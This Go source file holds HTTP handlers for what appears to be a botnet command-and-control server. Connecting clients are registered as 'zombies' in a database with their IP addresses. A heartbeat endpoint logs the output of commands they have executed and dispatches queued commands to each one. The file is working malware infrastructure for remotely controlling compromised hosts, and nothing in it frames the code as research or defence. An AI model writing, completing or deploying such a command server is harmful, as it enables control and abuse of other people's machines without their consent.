package main

import (
	"database/sql"
	"encoding/json"
	"github.com/rivo/tview"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// /////// ROUTES PROCESSING /////////
func HelloWorld(w http.ResponseWriter, req *http.Request) {
	logPrefix := "[yellow::b]HELLOWORLD[-::-] "
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(logPrefix + "Hello World!\n"))
}

func GetSID(w http.ResponseWriter, req *http.Request) {
	logPrefix := "[green::b]GETSID[-::-] "
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	ipHeader := req.RemoteAddr
	sid := createSID(10)
	DbgMsgEx(logPrefix+tview.Escape("From "+ipHeader+"=> GET /getSID SID: "+sid), true)
	res := ResGetSID{SessionId: sid, WelcomeMsg: "Welcome aboard:)"}

	jsonData, err := json.Marshal(res)
	if err != nil {
		DbgMsgEx(logPrefix+tview.Escape("Error JSON marshalling: "+err.Error()), true)
		w.WriteHeader(http.StatusInternalServerError)
	}
	w.Write([]byte(jsonData))
}

func Register(db sql.DB) http.HandlerFunc {

	return func(w http.ResponseWriter, req *http.Request) {
		logPrefix := "[cyan::b]REGISTER[-::-] "
		currentTime := time.Now()
		DbgMsg(logPrefix + "Current timestamp: " + strconv.FormatInt(currentTime.Unix(), 10))
		body, err := io.ReadAll(req.Body)
		if err != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error reading body: "+err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
		}
		DbgMsg(logPrefix + "Body is: " + tview.Escape(string(body)))
		var reqREG ReqRegister
		err = json.Unmarshal(body, &reqREG)
		if err != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error parsing body: "+err.Error()), true)
			w.WriteHeader(http.StatusBadRequest)
		}
		sid := reqREG.SessionId
		country := "US"
		remoteAddr := req.RemoteAddr
		splittedRemoteAddr := strings.Split(remoteAddr, ":")
		ipv4 := splittedRemoteAddr[0]
		port := splittedRemoteAddr[1]
		username := "zombie"
		lastConnTime := currentTime
		LogEx(logPrefix+tview.Escape("New client registered: <"+sid+"> ["+remoteAddr+"]"), true)

		query := "INSERT INTO zombies (SessionId, RemoteAddr, RemotePort, UserName, Country, FirstConnTime, LastConnTime ) VALUES (?,?,?,?,?,?,?)"
		DbgMsg(logPrefix + "Query: " + query)
		_, err = db.Query(query, sid, ipv4, port, username, country, currentTime, lastConnTime)
		if err != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error inserting row: "+err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		resREG := ResRegister{"Client successfully registered!"}
		resBody, err := json.Marshal(resREG)
		if err != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error parsing body: "+err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		DbgMsg(logPrefix + "Response body: " + tview.Escape(string(resBody)))
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Write(resBody)
	}
}

func HeartBeat(db *sql.DB) http.HandlerFunc {
	return func(w http.ResponseWriter, req *http.Request) {
		logPrefix := "[red::b]HEARTBEAT[-::-] "

		currentTimeStamp := time.Now()
		body, err := io.ReadAll(req.Body)
		DbgMsgEx(logPrefix+tview.Escape("Request body content: "+string(body)), true)

		if err != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error reading request body content: "+err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
		}
		var reqHB ReqHeartBeat
		err = json.Unmarshal(body, &reqHB)
		if err != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error parsing body content: "+err.Error()), true)
		}
		DbgMsgEx(logPrefix+"Request body parsed", true)
		query := "UPDATE zombies SET lastconntime = ? WHERE sessionid = ?"
		_, err1 := db.Query(query, currentTimeStamp, reqHB.SessionId)
		if err1 != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error updating row: "+err1.Error()), true)
		}

		if reqHB.Type == "exec" && reqHB.Status == "OK" {
			UILog(textView, reqHB.Message)
			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
		}

		Log(logPrefix + "Searching for commands to send...")
		response := GetCmdFromQueue(reqHB.SessionId, db)
		if response.Type == "" {
			DbgMsgEx(logPrefix+"Error no command to send", true)
		}

		resBody, err := json.Marshal(response)
		if err != nil {
			DbgMsgEx(logPrefix+tview.Escape("Error parsing response body: "+err.Error()), true)
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		DbgMsg(logPrefix + "Serialized response body: " + tview.Escape(string(resBody)))
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Write(resBody)
	}
}
